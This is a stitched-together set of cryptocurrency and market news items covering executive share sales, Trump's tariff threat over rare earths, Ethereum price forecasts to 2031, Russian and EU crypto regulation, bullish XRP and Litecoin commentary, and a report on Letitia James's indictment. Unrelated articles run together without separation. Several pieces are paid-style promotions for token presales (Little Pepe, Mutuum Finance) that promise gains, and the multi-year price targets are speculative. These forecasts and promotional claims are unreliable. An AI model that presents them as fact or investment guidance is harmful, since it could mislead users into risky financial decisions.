The sell-off came just months after the company’s March IPO turned four employees into billionaires and sent the company’s stock price soaring more than 250%. The two biggest names behind the sell-off were Jack Cogen and Brannin McBee, who together pulled in nearly $900 million in planned stock sales. Jack, a board member since 2017, offloaded more than 5.1 million shares, netting $477 million through a trading plan he set up in May. He had agreed to sell 3.4 million shares over a three-year period if price thresholds were hit. CoreWeave’s stock rise hit those levels fast. Jack met the company’s founders through his old firm, Natsource Asset Management, and was previously a director at CEO Michael Intrator’s hedge fund, Hudson Ridge, which later evolved into CoreWeave’s AI business. Brannin, who co-founded the company in 2017 after working in energy and agriculture trading, sold 4 million shares worth $426 million, representing 14% of his total stake. He adopted his 10b5-1 plan in May, with all his shares sold by quarter-end. Now serving as Chief Development Officer, Brannin started out as Chief Strategy Officer before changing roles last year. He’s now valued at $3.9 billion, based on Bloomberg’s Billionaires Index. AI stockholders keep cashing out as valuations explode The CoreWeave sell-off wasn’t isolated. Seven of the ten biggest stock unloaders this quarter are all riding the AI train. Magnetar Financial, the biggest institutional backer of CoreWeave, sold $1.9 billion worth of shares in the same quarter. It still holds over 20% of the firm’s Class A stock. Over at Arista Networks, CEO Jayshree Ullal cashed out 6.4 million shares worth $861 million using a plan she put in place in December. With a net worth now at $6.9 billion, Jayshree has already moved 7.5 million shares in 2025, placing her ahead of Meta’s Mark Zuckerberg in stock sales this year. Nvidia’s CEO Jensen Huang sold 4.3 million shares during the third quarter alone, netting $743 million. His trading plan, set in March, aims to sell 6 million shares by year-end. He’s nearly there. The whole thing was originally priced at $865 million, but as Nvidia stock kept surging, he’s now on track to walk away with nearly $1 billion. But the biggest stock seller was Jeff Bezos. The Amazon founder sold 21.6 million Amazon shares in Q3, almost $5 billion worth, under a trading plan that began in June. By the time he was done, Jeff had sold 25 million shares and pulled in $5.7 billion total. He hasn’t bought more than one share since 2002 and uses much of the money for Blue Origin, his space company. Top tech execs unload shares as market rides AI mania Frank Slootman, who stepped down as Snowflake’s CEO but remains chairman, made $462 million after selling over 2 million shares in line with a trading plan set in March. Tony Ressler, co-founder of Ares Management, sold exactly 2 million shares for $357 million. He moved them from his holding partnership into an LLC he controls and cashed out, bringing his net worth to $12.2 billion at press time. Herald Chen, who used to be CFO at AppLovin, sold 700,000 shares for nearly $313 million. This was his second straight quarter appearing on the top-sellers list. He’s now off the executive team but has been exercising old options he got in 2019. Baiju Bhatt, co-founder of Robinhood, sold 2.8 million shares valued at $296 million. What stood out is that 1.6 million of those shares weren’t part of his earlier trading plan. Baiju is now worth $8.9 billion, and he left his role as Chief Creative Officer in February. Brian Armstrong, CEO of Coinbase, sold 700,000 shares in Q3, earning $268 million. He had set up a plan in August 2024 to sell up to 3.75 million shares and has been offloading stock every two weeks since. Brian had said back in 2022 that he was selling Coinbase stock to support science research and fund NewLimit, his biotech firm focused on longevity. If you're reading this, you’re already ahead.

That retreat sped up in a big way in late-morning U.S. action on Friday after trade war tensions between the U.S. and China ratcheted higher. U.S. President Donald Trump said in a Truth Social post minutes ago that he's preparing a ""massive increase"" in tariffs on Chinese goods in response to China earlier imposing export controls on rare earth metals. Following the post, bitcoin (BTC) plunged below $119,000 from $122,000. Ether (ETH), solana (SOL) and XRP each joined in the swift decline. The drop in crypto prices also weighed on stocks tied to the sector. Circle (CRCL) fell over 6%. Robinhood (HOOD), which gets a large portion of its trading activity from crypto, declined 5%. Coinbase (COIN) also shed 5%, while MicroStrategy (MSTR) slipped about 3%. The news rippled across traditional markets, too. WTI crude oil dropped nearly 4% below $60, its weakest price since early May. The S&P 500 and Nasdaq were 1.6% and 1.3% lower, respectively. Gold? It rallied more than 1% to back over $4,000 per ounce as the yellow metal once again showed itself, not bitcoin, to be the risk-off asset of choice for investors.

In 2028, Ethereum is anticipated to trade between $13,230 and $15,514 with an average expected price of $13,687. In 2031, ETH could trade between $38,830 and $48,873 with an average price of $39,986. The Ethereum network, launched in 2015, is a decentralized platform that enables developers to create smart contracts and dApps using blockchain technology without intermediaries, enhancing security. The Ethereum blockchain is accessible to everyone and built to support scalability, programmability, security, and decentralization, allowing for the creation of secure digital technology. Its native digital currency, ether (ETH), and smart contracts have attracted investors’ recognition and interest, while developers appreciate its utility in developing blockchain and decentralized finance applications. It also helps traders trade Ethereum more easily. So, what can traders and investors expect in the coming months and years? “Is ETH likely to go up? What will ETH be worth in 5 years?” Let’s get into the details by exploring Ethereum’s price predictions from 2025 through 2031. Overview Cryptocurrency Ethereum Symbol ETH Current price $4,356 Market cap $525.94B Trading volume (24-hour) $39.42B Circulating supply 120.7M All-time high $4,891 on Nov 16, 2021 All-time low $0.4209 on Oct 22, 2015 24-hour high $4,395.57 24-hour low $4,273.56 ETH price prediction: Technical analysis Metric Value Price volatility 4.80% 50-day SMA $ 4,351.99 200-day SMA $ 3,142.29 Sentiment Neutral Fear and Greed Index 64 (Greed) Green days 14/30 (47%) Ethereum (ETH) price analysis Ethereum is consolidating near $4,340 after recent downward pressure, showing reduced volatility and market indecision Support at $4,250 remains crucial for preventing deeper losses and could spark a rebound toward $4,430 or $4,600 Bearish momentum persists, and failure to hold support may push ETH toward $4,100 in the short term Ethereum price analysis 1-day chart: Ethereum faces consolidation as price holds above $4,300 support Ethereum (ETH) is currently trading around $4,345 on Oct 10, showing mild bearish momentum after failing to sustain above $4,500. The Bollinger Bands suggest price compression near the midline at $4,307, indicating potential indecision before a larger move. The RSI at 51.85 reflects neutral momentum, neither overbought nor oversold. ETHUSD chart by TradingView Meanwhile, the MACD shows weakening bullish signals as the histogram narrows, hinting at a possible short-term correction. If ETH holds above the $4,300 support, buyers may attempt a recovery toward $4,600. However, a break below $4,300 could expose the price to the lower Bollinger Band near $3,900, signaling deeper downside risk. ETH price analysis on the 4-hour chart: Ethereum consolidates near $4,340 as bears test key support zone Ethereum’s 4-hour chart reveals a consolidation phase around $4,340, signaling market indecision after recent volatility. The Bollinger Bands are tightening, suggesting reduced volatility and a potential breakout ahead. The MACD histogram remains negative, showing persistent bearish momentum, while the Balance of Power indicator at -0.26 confirms seller dominance. ETHUSD chart by TradingView However, ETH holding above the $4,250 support zone could prevent further decline and invite short-term buying interest. A recovery toward $4,430 and $4,620 may occur if bullish sentiment strengthens, but failure to hold support may push prices down toward $4,200, marking a deeper short-term correction before potential reversal attempts.

Ethereum’s price analysis suggests a cautious outlook as the coin trades near $4,340, consolidating after its recent downward move. The market appears to be in a cooling phase, with both MACD and Balance of Power indicating bearish dominance and limited bullish momentum in the short term. If Ethereum maintains support above $4,250, it could trigger a mild rebound toward $4,430 or even $4,600, depending on broader market strength. However, failure to hold this level might invite further selling pressure, potentially driving ETH toward $4,100 or lower. Traders should watch for volatility expansion and confirmation of breakout direction. Is ETH a good investment? Ethereum blockchain is the largest DeFi hub with a vibrant layer-two ecosystem in the crypto market. The blockchain constantly develops, making it a go-to choice for many Web3 developers. ETH, its native token, shows promise, and the possibility of an Ethereum ETF approval makes it favorable for day traders. Over the long term, explore our price predictions. However, the opinions expressed are not investment advice; traders should consider researching before investing. What is a realistic price for Ethereum in 2025? The realistic price for Ethereum in 2025 is around $4,619 at the maximum. What will 1 Ethereum be worth in 2030? One Ethereum is expected to be worth $34,223 maximum in 2030. How high can ETH realistically go? Ethereum’s price potential depends on multiple factors, including market trends, institutional adoption, network upgrades, and macroeconomic conditions. Realistically, ETH could reach $5,000 to $7,000 in the next bullish cycle if demand increases and Ethereum’s Layer 2 solutions and scalability improvements boost adoption. If institutional interest strengthens, ETH may push past $10,000 over the long term, especially if Ethereum remains the dominant smart contract platform. However, volatility remains a key risk, with price corrections likely along the way. Regulatory clarity and Ethereum’s shift to proof-of-stake (PoS) efficiency could also positively influence its long-term valuation. Will ETH reach $10,000? Ethereum is projected to exceed $10,000 as early as 2027, with a potential high of $10,199. Will ETH reach $25,000? Based on price predictions, Ethereum is unlikely to surpass the $25,000 level by 2029. By 2029, the ETH’s potential high is expected to be $23,496. This optimistic outlook is based on Ethereum’s ongoing development, network security, and increasing adoption. However, cryptocurrency markets are highly volatile, so long-term projections should be cautiously approached. Will ETH reach $40,000? Based on our analysis, Ethereum platform will likely reach the $40,000 mark. The highest expected price is around $48,873 in 2031. Does Ethereum have a good long-term future? Most well-known altcoins are trading at lower levels, but ETH is trading above its average price of the last two years. However, a positive outbreak can be expected. The ETH/USD pair is expected to reach the $48,873 mark by 2031, so holding it longer can be beneficial.

Price Prediction Potential Low ($) Average Price ($) Potential High ($) October 2025 $3,732 $4,125 $4,243 Ethereum price forecast 2025 Ethereum has a strong potential to push towards $4,138 and $4,619 by the end of 2025, with an average of $4,334 as adoption accelerates. With Layer-2 scaling, growing institutional trust, and deflationary supply, ETH looks poised for steady appreciation, making it one of the most resilient and optimistic assets in the crypto market.

The ETH price could go as high as $7,492, with an average forecast price of $6,299. Ethereum ETH price prediction 2027 Ethereum’s 2027 forecast of $8,838–$10,199, averaging $9,150, is fueled by massive Layer-2 adoption, institutional-scale DeFi growth, and mainstream integration of blockchain in finance and governance. By then, ETH’s deflationary supply dynamics and global acceptance as a settlement layer could drive demand sharply higher, supporting optimistic long-term price appreciation. Ethereum price prediction 2028 In 2028, the price of one Ethereum is expected to be at least $13,230. The average price of ETH in 2028 will be $13,687, but the highest price could be $15,514. By this stage, global adoption in finance, enterprise solutions, and tokenized assets is expected to be widespread. Combined with advanced scaling solutions and deflationary supply mechanics, ETH demand should surge, supporting higher valuations. Ethereum ETH price prediction 2029 It is expected that the price of Ethereum to be at least $19,790 in 2029. The average trading value of Ethereum in USD is $20,474, but the price can go as high as $23,167. However, this is supported by its position as a global financial and digital infrastructure backbone. By then, tokenization of real-world assets, enterprise adoption, and government-level blockchain use are expected to accelerate. Ethereum price prediction 2030 By 2030, Ethereum’s forecast minimum price could rise to $28,073 while the expected average trading price is projected at $28,892. A potential high that may reach $34,223, showcases Ethereum’s increasing appeal to investors. Ethereum price prediction 2031 According to the forecast and technical analysis, the price of Ethereum should be at least $38,830 in 2031. The average price of ETH is $39,986– but it can go as high as $48,873. This is underpinned by its full integration into global finance, enterprise infrastructure, and digital identity systems. With widespread tokenization, institutional dominance, and deflationary tokenomics, ETH is positioned as a core digital asset, driving sustained demand, long-term scarcity, and strong upward momentum in valuation.

Among the most talked about are Little Pepe (LILPEPE), Turbo (TURBO), and Snek (SNEK). These three are currently priced cheaper than Dogecoin, but each shows unique growth potential as the next wave of community-driven crypto projects. At the time of writing, Little Pepe (LILPEPE) is in presale stage 13, selling at $0.0022 per token, with over $26.6 million raised out of its $28.7 million target. The project has already seen early investors achieve over 120% gains since Stage 1, when the token was priced at $0.0010. With the launch price set at $0.0030, current investors still have around 36.36% gain potential before launch. LILPEPE has now been listed on CoinMarketCap and audited by CertiK, confirming its credibility. Little Pepe (LILPEPE): The Meme Coin With Real Utility Little Pepe is more than just a meme token. It is building its own Ethereum Layer 2 chain that supports meme and viral tokens while maintaining zero trading tax, sniper bot protection, and an anti-whale structure. This makes it stand out in a crowded meme coin market, which is dominated by speculation. The presale is moving fast, with over 94.4% of stage 13 already filled. The team has also launched a $777K Giveaway, along with a Mega Giveaway offering over 15 ETH in rewards to top presale buyers from stages 12 to 17. LILPEPE recently surpassed Dogecoin, SHIB, and PEPE on the ChatGPT 5 meme coin trend chart between June and August 2025, indicating its growing community interest. With more than 16.29 billion tokens sold out of 17.25 billion, this project is nearing its next price jump. Turbo (TURBO): AI-Powered Meme Innovation Turbo is one of those meme coins born out of curiosity and AI, and it’s startling how far it’s come. At the time of writing, TURBO trades at around $0.0037 with a market capitalization of $250-$260 million, and approximately 69 billion tokens are in circulation. Because there are so many tokens, achieving $1 per TURBO would mean either massive adoption or significant burning of the supply (which has not been strongly signaled). Still, what keeps it on people’s radar is its origin: an AI experiment. Snek (SNEK): The Cardano Meme That Won’t Quit Snek is a community-driven meme token built on the Cardano blockchain. Its goal is simple: bring fun, culture, and utility into the Cardano world. SNEK is trading at around $0.0041 at the time of writing. SNEK is one of the cheap tokens that could hit $1 before the end of 2025. Final Thoughts Among the three, Little Pepe stands out for combining meme energy with solid infrastructure, audited security, and tangible utility. At the time of writing, investors can still participate in the LILPEPE presale at $0.0022, before it launches at $0.0030, offering an estimated 36.36% gain potential. With over $26.6 million raised, a $777,000 giveaway, and a growing presence on CoinMarketCap, LILPEPE is proving that the meme coin era is far from over; it’s simply evolving.

These tokens, priced lower than Dogecoin, present intriguing investment opportunities with their robust ecosystems and vibrant communities. Introducing Little Pepe, Turbo, and Snek Dogecoin's reign as the premier meme coin might be challenged by newcomers Snek (SNEK), Turbo (TURBO), and Little Pepe (LILPEPE). These tokens are not only more affordable but also come with promising technological advancements and community support. Spotlight on Little Pepe (LILPEPE) Among the standout newcomers is Little Pepe, a token that blends meme appeal with substantial technical infrastructure. Notably, LILPEPE is creating its own Ethereum Layer 2 chain, catering specifically to meme and viral tokens while eliminating trading taxes and fortifying against market manipulations, such as those from sniper bots and whales. The coin has rapidly progressed through its presale phases, demonstrating robust investor confidence and near-complete sell-outs in its later stages. Here's a closer look at its growth: With an impressive presale performance and planned giveaways, Little Pepe is a prime example of how modern meme coins can secure a viable spot in the crypto market. Exploring Turbo (TURBO): A Blend of Meme and AI Turbo leverages AI to elevate its status beyond just a meme coin, incorporating cutting-edge technology to enhance its market appeal. TURBO's price performance and its unique positioning as a tech-forward token keep it on the radar for investors looking for coins with the potential to scale. Snek (SNEK): The Cultural Staple of Cardano's Ecosystem Snek brings a playful yet purposeful energy to the Cardano network, aiming to inject fun and cultural relevance into its blockchain framework. Its affordability makes it a strong candidate for significant value increase in the near future. Conclusion While Dogecoin remains a popular meme coin, Little Pepe, Turbo, and Snek represent a new era in the cryptocurrency space, where fun and functionality meet. With their unique propositions and community-driven projects, they are poised to possibly reach or even exceed the $1 mark by 2025.

The US president said Beijing is “becoming very hostile” and warned that its sweeping new rules were designed to “clog the Markets” and make life difficult for every nation. In the Truth post, Trump called China’s move a shocking betrayal after six months of what he described as a smooth trade relationship. He revealed that letters had been sent to multiple governments across the world detailing planned export controls on rare earth elements, and he said those messages listed “each and every Element” Beijing aimed to block. “Things that were routine are no longer routine at all,” Trump wrote. “I have not spoken to President Xi because there was no reason to do so. This was a real surprise, not only to me, but to all the Leaders of the Free World. I was to meet President Xi in two weeks, at APEC, in South Korea, but now there seems to be no reason to do so. The Chinese letters were especially inappropriate in that this was the Day that, after three thousand years of bedlam and fighting, there is PEACE IN THE MIDDLE EAST. I wonder if that timing was coincidental?” Trump cancels Xi meeting and prepares U.S. counter In the Truth post, Trump added China’s real plan was to build a monopoly over rare earths. He said : “I have always felt that they’ve been lying in wait, and now, as usual, I have been proven right! There is no way that China should be allowed to hold the World ‘captive,’ but that seems to have been their plan for quite some time, starting with the ‘Magnets’ and other Elements that they have quietly amassed into somewhat of a Monopoly position, a rather sinister and hostile move, to say the least.” Trump added that the United States holds stronger monopolies of its own but had not used them “UNTIL NOW.” Trump declared that he was preparing to hit back hard. “Dependent on what China says about the hostile ‘order’ that they have just put out, I will be forced, as President of the United States of America, to financially counter their move. For every Element that they have been able to monopolize, we have two.” Trump said his team was calculating “a massive increase in Tariffs on Chinese products coming into the United States of America.” He added that “many other countermeasures” were under serious study. Markets crash after Trump statement The reaction from investors was brutal. Within 30 minutes of Trump’s statement, the S&P 500 plunged more than 100 points. Crypto markets also took a beating, with $200,000,000 liquidated in just 15 minutes. Oil slid to $59.32, hitting its lowest level since May 8. This dramatic response is coming right after China’s Ministry of Commerce rolled out new restrictions on rare earth exports. The rules, announced Thursday, tighten access to raw materials critical for making semiconductors and defense systems. They followed earlier restrictions introduced in April, which had briefly been eased in June after negotiations. China controls the bulk of global mining and processing of rare earths, which are needed for laptops, fighter jets, and medical equipment. In response to Trump’s tariff blitz that began this winter, Beijing had tightened controls in April but agreed to speed up shipments in June. After the April restrictions set off alarms across the private sector and U.S. government, Washington has raced to build up U.S. rare earth processing capability in places like Oklahoma.

Russia plans to conditionally allow banks to offer cryptocurrency services, according to local news agency Interfax. Speaking at the Finopolis 2025 forum, First Deputy Governor of the Central Bank of Russia Vladimir Chistyukhin said that despite the institution's conservative stance towards crypto, it is examining allowing banks to work with cryptocurrencies. Central bank deputy Chistyukhin added that they concluded that a complete ban on such crypto activities would be inappropriate. However, Chistyukhin noted that strict regulations, including capital ratio and reserve requirements, will be implemented to prevent banks from over-concentrating on crypto services. “We are fundamentally conservative on cryptocurrencies, but we have decided that it is unwise to completely exclude and ban banks from the cryptocurrency market. However, we plan to impose strict conditions to ensure that cryptocurrency-related activities do not become a bank's core business.” Legal Ground for Cryptocurrencies is Coming! Finally, Chistyukhin noted that the cryptocurrency market in Russia has been legalized. He stated that the necessary legal infrastructure for investors to safely trade with cryptocurrencies is planned to be operational by 2026. At this point, Chistyukhin, who expects a law covering cryptocurrency investments in general to come into force next year, said, “This bill will include a licensing system that will allow legitimate cryptocurrency service providers to enter the market by the end of 2026.” The aim is to reduce informal economy and protect investors. License applications will be collected within the same year, and the first authorized institutions are expected to begin operations by the end of the year. The second phase of the reform will come into effect in 2027. During this period, administrative and criminal sanctions will be imposed on unauthorized or unregistered cryptocurrency transactions. *This is not investment advice.

The European Commission is standing by its current rules, but central bankers want much stricter oversight. On Friday, the Commission pushed back against calls from the European Central Bank for tougher measures, insisting that existing crypto regulations already do enough to keep stablecoin risks in check. Stablecoins have become one of the fastest-growing corners of the crypto world. These tokens keep their value stable by tying themselves to traditional currencies like the dollar or euro. The U.S. even passed laws this year to boost their use. Europe rolled out its own comprehensive crypto rulebook recently, but the ECB is now pressuring Brussels policymakers to crack down on what the industry calls “multi-issuance”, essentially, whether global stablecoin companies can treat tokens issued in the EU the same as those issued elsewhere. Industry pushes back Six crypto industry groups wrote to European Commissioner Maria Luis Albuquerque on Tuesday asking the EU to clarify that multi-issuance is allowed under MiCA (the bloc’s crypto regulations). Circle, a major stablecoin issuer , is among the groups’ members. A Commission spokesperson told Reuters via email that they’d received the letter and believe “MiCA provides a robust and proportionate framework for addressing risks stemming from stablecoins.” They promised to provide clarification soon. But the European Systemic Risk Board, chaired by ECB President Christine Lagarde, sees real dangers here. They’ve warned that multi-issuance could threaten financial stability and want protective measures put in place now. If people holding tokens from a stablecoin company’s non-EU operations suddenly decide to redeem them through the company’s EU entity, it could spark a run on reserves held in Europe. Stablecoin companies say this isn’t a problem, they maintain enough reserves to handle redemptions anywhere. JP Morgan analysts pointed out this week that 99% of stablecoin supply is dollar-linked anyway, and predicted the sector’s growth will only increase demand for U.S. currency. France wants centralized control The Bank of France is taking things further, calling for the EU to give its securities regulator direct authority over major crypto firms . Their concern? That fragmented oversight could put Europe’s financial independence at risk. Speaking at the ACPR-AMF Fintech Forum in Paris on Thursday, Bank of France Governor François Villeroy de Galhau argued that the European Securities and Markets Authority should directly supervise crypto issuers under MiCA. “I also advocate, along with the president of the AMF, for European supervision of crypto-asset issuers, carried out by ESMA,” he said, adding that this would ensure consistent rule application and reduce risks. Villeroy de Galhau’s worry is that relying on national regulators leads to uneven enforcement across the EU just when crypto businesses are expanding rapidly. Direct oversight by ESMA (which happens to be based in Paris) would prevent regulatory arbitrage and ensure major players face the same standards everywhere. “The implementation of MiCA is a decisive step forward,” he said. “But its effectiveness requires a more unified approach if we are to protect European investors and maintain a level playing field.” He also flagged the growing threat from dollar-backed stablecoins, calling MiCA’s permission for multi-issuance a regulatory gap. The current framework lets companies issue identical tokens both inside and outside the EU while keeping only partial reserves in each jurisdiction. The risk, according to Villeroy de Galhau? Stablecoins could undermine the euro and lead to an uncontrolled proliferation of private payment systems, making Europe more dependent on non-European, unregulated entities. Bank of Italy Deputy Governor Chiara Scotti voiced similar concerns back in September, warning that the multi-issuance model could harm financial stability and should be restricted.

The recent price spike raises a crucial question: Will LTC manage to break through the $150 barrier soon? This article delves into key market trends and highlights coins poised for potential growth. Keep reading to discover which assets are on the move. Litecoin Holds Steady, Poised for Potential Growth Source: tradingview Litecoin is currently trading between $106 and $128, showing steady movement. It's seen a noticeable increase of over 10% in the last week and almost 18% in the past month, indicating strong momentum. The Relative Strength Index is at 63, suggesting it's nearing overbought territory but still has room to grow. If momentum continues, Litecoin could test its next resistance at $136, and possibly even reach the $157 mark in the longer term, marking a jump of nearly 23%. However, if the coin faces a downward shift, support at around $95 should provide stability. With a six-month growth of over 67%, Litecoin's upward trend remains promising. Conclusion LTC has shown impressive gains, jumping 13% within a day. The next key level is $150. Breaking this level could open new highs for the coin. With strong momentum and market interest, it is crucial to watch how LTC performs in the coming days. Successful surpassing of the $150 mark could signal further growth. The coming sessions will be critical in determining whether LTC can sustain its upward trajectory. Disclaimer: This article is provided for informational purposes only.

The strength of the meme token is being fueled by engaged community support, social hype, and new retail FOMO, which creates a classic meme-driven scenario for short-term speculators. On-chain metrics show strong accumulation at key levels of support, with technical charts calling for a likely breakout if buying demand continues. While SHIB’s meme value is assured, most investors currently look for utility-driven projects with potential in the early stages as well as actual usage in the real world. Mutuum Finance (MUTM) that is worth serious deliberation is now in Presale Phase 6 and at a price of $0.035, with more than 60% sold and more than 15,800 investors already in the project. Its established DeFi base and actual applications make it a consideration worth thinking about for a potentially exponential growth post-meme-hyped bubble. Shiba Inu (SHIB) Price to 10x Breakout as Major Technical Levels Shiba Inu (SHIB) at $0.0000127, below a downtrend line that has suppressed rallies since January 2025. There are two primary areas on the chart that will determine the direction of the chart in the future: a firm buy area at $0.0000103, where buyers have consistently come in to support, and a trend reversal area at $0.0000176, which would confirm a shift to bullish momentum if broken. SHIB is range-bound now, slowly unwinding between support and resistance. A strong break above $0.000014–$0.000015 can set the stage towards the trend reversal area, and a drop below $0.000012 can retest the demand zone near $0.0000103. Confirmation on volume will be needed with any breakout, and overall sentiment remains neutral to cautiously bullish, i.e., traders are watching very closely for the next trend-defining move. While SHIB remains fascinating with meme-inspired price rallies, investors also monitor newer project Mutuum Finance since they are more interested in alternatives to mainstream meme coins. Mutuum Finance Presale Mutuum Finance (MUTM) is at Stage 6 presale with more than 16,830 listed investors and more than $17.05 million tied up. The numbers show growing market faith in the future of the project in the long term and makes it the much-desired investment ecosystem for investors to invest and achieve sustainable revenues and long-term growth. The protocol also maintains close Loan-to-Value (LTV) mix and dynamic liquidation protocol, both of which react dynamically to shock prices in real time. It also carries a 10% to 35% reserve multiplier by collateral risk profile, whose function is that of layering further collateral on top of platform overall resilience enhancement. Mutuum Finance also features a $50,000 bug bounty program where it classifies vulnerabilities into four levels of risk – critical, major, minor, and low – and has an effective detection and prevention mechanism in advance before problems reach the community. Open architecture with security by design makes Mutuum Finance a secure, stable, and resilient DeFi protocol. Mutuum Finance Lending & Borrowing Protocol Mutuum Finance also launched its groundbreaking lending and borrowing protocol , a huge milestone in its active DeFi ecosystem. V1 will arrive at Sepolia Testnet during Q4 2025 with some of its most important features being liquidity pool, mtToken, debt token, liquidator bot, etc. ETH and USDT will collateralize borrow, lend, and collateralizable assets on the launch day with an open-ended and scalable solution of DeFi. Looking Beyond Meme Coins While Shiba Inu (SHIB) is looking to soak in a possible 10x rally, investors are also eyeing Mutuum Finance (MUTM) for growth-driven utility. Phase 6 presale tokens are priced at $0.035, with over $17.05M raised, 16,830+ investors, and 60% already sold out. The platform features variable LTV ratios, live liquidation, and reserve multipliers for efficient risk management. Its impending lending and borrowing protocol on Sepolia Testnet, backed by ETH and USDT, offers a secure, scalable, and frictionless DeFi world. Early adopters can position themselves today to seize long-term value over meme-based madness.

Pundit Claims ‘Sellers Are Exhausted’,https://www.newsbtc.com/xrp-news/is-the-xrp-bottom-in-sellers-exhausted/,"Crypto commentator Zach Rector argues that XRP’s months-long malaise is nearing a turning point, contending that selling pressure has largely run its course and that a fresh wave of institutional demand is lining up on the other side of the ledger. “XRP sellers are exhausted,” Rector said in a video analysis published late on October 9, adding that “the downside action and the consolidation that we’ve seen over the past few months is coming to an end and the suits are now getting ready to sell it with slideshow presentations.” Reasons To Be Bullish On XRP Rector’s central thesis is that structurally constrained float and prospective exchange-traded products could catalyze a supply squeeze. He framed the timeline around a US government shutdown, asserting that approval activity would not resume until after a reopening: “ETFs are set to go live for XRP as soon as the government shutdown ends. No, I am not anticipating the SEC to approve the ETFs while the government is shut down.” He characterized the post-shutdown period as a potential “tidal wave of XRP, crypto, and other related ETFs,” while acknowledging that the precise sequencing depends on regulators returning to normal operations. Related Reading: XRP Could Retest Triangle Support At $2.72, Analyst Warns Pointing to what he sees as a template in other assets, Rector highlighted a recent trading episode he attributed to BlackRock’s Ethereum ETF. In his telling, “Jane Street… spark[ed] a massive momentum ignition selloff just in time for BlackRock’s ETF to buy the most Ether in 2 months,” with $437 million of inflows arriving on a day of heavy price weakness. “While they’re hitting the sell button, panicking… the investors at BlackRock are saying, ‘Thank you very much,’” he said. He extrapolated from this to XRP, claiming “the suits have the champagne on ice cuz they know that they’re about to go break records with the XRP ETFs.” Beyond the ETFs, Rector emphasized on-chain and DeFi dynamics that he believes reduce liquid supply. He cited activity around Flare’s FXRP mechanism, describing wallet flows and escrowed balances as visible on public ledgers: “So far, Flare has already locked up almost $60 million worth of XRP. That’s equivalent to about 20 million XRP.” Rector broadened his supply-tightening thesis to digital asset treasury (DAT) companies, asserting they had “already actually acquired 10% of the overall Ethereum supply” and were now “coming for XRP.” XRP Momentum Builds He also alluded to tokenization and payments initiatives he associates with Ripple and the XRP Ledger, asserting that “they really are going to tokenize on the XRP Ledger” and bring “flows of liquidity that are valued in the trillions of dollars” onto the network. As evidence of institutional momentum, he pointed to European and Middle Eastern developments. Citing a post from VanEck’s Matthew Sigel, he said “Luxembourg becomes the first EU sovereign wealth fund to buy Bitcoin with a 1% position via ETF,” and noted recent meetings between Ripple executives and Luxembourg’s finance minister. He also referenced Ripple’s expansion in the Middle East, including Bahrain, as reinforcing an institutional pipeline. Related Reading: XRP Bull Run Reloaded: Analyst Says Momentum Mirrors 2017’s Explosive Rally On market structure, Rector said the recent intraday push lower found support above a level he is monitoring. “I zoomed out… to when we last back tested $2.70 just to show you… support,” he said, noting a visit to “about 2.77… people are front running that $2.70 level… we’re up to $2.81.” For investors worried that a peak is already in, he pushed back: “Was that the end of the XRP bull run? Did I just miss the top at 3.66? Absolutely not… imagine thinking that now’s the time to sell when Wall Street’s about to start selling it for you.” Rector’s explicit forward targets were sweeping. He said newcomers could “still… triple it up at least by next year,” and that a “10x” remained plausible under his “$20 to $30 base case,” characterizing “double-digit XRP” as “easily done.” Throughout, he tied the outlook to a cluster of catalysts—“ETFs, digital asset treasury companies, and institutional adoption”—and to what he regards as a steady constriction of tradable float via DeFi lockups. “That’s what leads to a supply shock,” he said. “This party’s just getting started.” At press time, XRP traded at $2.815.

According to reports, James was indicted Thursday by a federal grand jury in Virginia, and this comes not long after Trump publicly asked his Justice Department appointees to target her. Why is New York AG James facing charges? Bloomberg cited confidential sources alleging that James’ bank fraud indictment comes after she faced allegations from Trump administration officials that accuse her of engaging in mortgage fraud. The allegation is based on claims made by Federal Housing Finance Agency Director Bill Pulte and alleges that she may have committed mortgage fraud based on the residence status she listed on loan applications. According to the indictment, James falsely claimed that a home in Norfolk, Virginia, was her second residence that she rented to a family of three, which allowed her to obtain favorable loan terms. If convicted, James could face up to 30 years in prison and up to a $1 million fine on each count. However, she has vehemently denied the charges, and her lawyer is being cautious with his statements. The case is being overseen by acting U.S. Attorney Lindsey Halligan—a former personal attorney to President Trump—who has described the charges as representing “intentional, criminal acts and tremendous breaches of the public’s trust.” The indictment is being regarded as political retaliation by critics AG Letitia James has been ruffling feathers for a long time with a track record of a rampaging regulatory enforcement streak . In fact, some Republicans and crypto enthusiasts may dare to say she has had it coming, as she has been a person of interest because her office, the New York Attorney General’s Office, has aggressively enforced the state’s stringent cryptocurrency regulations under the BitLicense framework established in 2015. She also got on President Trump’s bad side while he was out of office. Last month, Trump called for legal action against James in a message to Attorney General Pam Bondi on social media, claiming that delay can no longer be entertained because it is killing the American reputation and credibility. “JUSTICE MUST BE SERVED, NOW!!!” Trump wrote in a Truth Social post. This comes not long after the US attorney’s office in the Eastern District of Virginia secured a grand jury indictment against former FBI Director James Comey, who the president also publicly called to be prosecuted. Comey has also denied the allegations and is fighting the charges in court. Both cases are already heightening concerns about the Department’s independence and fueling allegations that prosecutors are improperly using the office to punish those who stand against the president. This is especially concerning when Trump critics recall how Erik Siebert resigned from the Virginia U.S. Attorney’s office last month amid pressure. Siebert had refused to support charges against James, claiming there wasn’t enough evidence. Trump has since installed Lindsey Halligan as interim US attorney, and she has delivered indictments against both Comey and James.

For XRP, the digital asset powering Ripple’s global payment ecosystem, that utility is becoming increasingly clear. Once defined by legal battles, XRP is now making headlines for adoption , innovation, and institutional interest. As Austin Hilton explained in a recent video shared on X, five key factors are positioning XRP for greater long-term value — and together, they form a compelling case for its future growth. Cross-Border Efficiency: XRP’s Enduring Advantage Hilton began by revisiting XRP’s original purpose — revolutionizing global payments . “XRP is at the heart of Ripple’s money transfer system,” he said, highlighting its unmatched ability to move money across borders faster and more efficiently than traditional systems. Acting as a bridge currency, XRP eliminates the need for pre-funded accounts, cuts settlement time from days to seconds, and drastically reduces transaction costs. With transaction finality achieved in just three to five seconds — compared to Bitcoin’s ten minutes or SWIFT’s two to five days — XRP continues to set the benchmark for modern financial settlement. 5 Key Reasons That XRP Will Be Worth More In The Future… pic.twitter.com/PQz4WkjG6c — Austin Hilton (@austinahilton) October 9, 2025 Everyday Integration and Real-World Use Hilton also emphasized XRP’s growing presence beyond the banking sector. “XRP is increasingly used outside of financial institutions,” he explained, pointing to practical integrations that demonstrate its expanding utility. One notable example is Bustour, which “has established a $300 million XRP treasury to support blockchain-powered travel vouchers and loyalty point settlements.” This initiative allows over 60 million loyalty members to use XRP for airport transfers, premium rides, and travel experiences — turning XRP into a payment asset people actually use in their daily lives. Institutional Confidence and Treasury Adoption Institutional trust in XRP is another major catalyst Hilton 